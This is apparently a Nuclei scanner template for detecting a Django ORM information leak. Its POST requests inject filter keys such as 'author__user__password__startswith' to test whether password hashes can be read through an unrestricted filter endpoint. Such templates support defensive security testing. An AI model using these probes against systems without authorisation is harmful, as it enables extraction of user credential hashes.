http:
- matchers:
  - status:
    - 200
    type: status
  - type: word
    words:
    - admin
  matchers-condition: and
  raw:
  - "POST /articles/filter/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    \n{\n  \"title__startswith\": \"admin\"\n}\n"
- matchers:
  - status:
    - 200
    type: status
  - type: word
    words:
    - pbkdf2_sha256
  matchers-condition: and
  raw:
  - "POST /articles/filter/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    \n{\n  \"author__user__password__startswith\": \"pbkdf2_sha256\"\n}\n"
id: django-orm-leak
info:
  author: ProjectDiscoveryAI
  description: 'This template checks for information leaks in Django applications
    due to improper handling of ORM queries. By passing unrestricted keyword arguments
    to the Django ORM filter method, it becomes possible to construct queries that
    access sensitive data.

    '
  name: Django ORM Information Leak
  severity: high
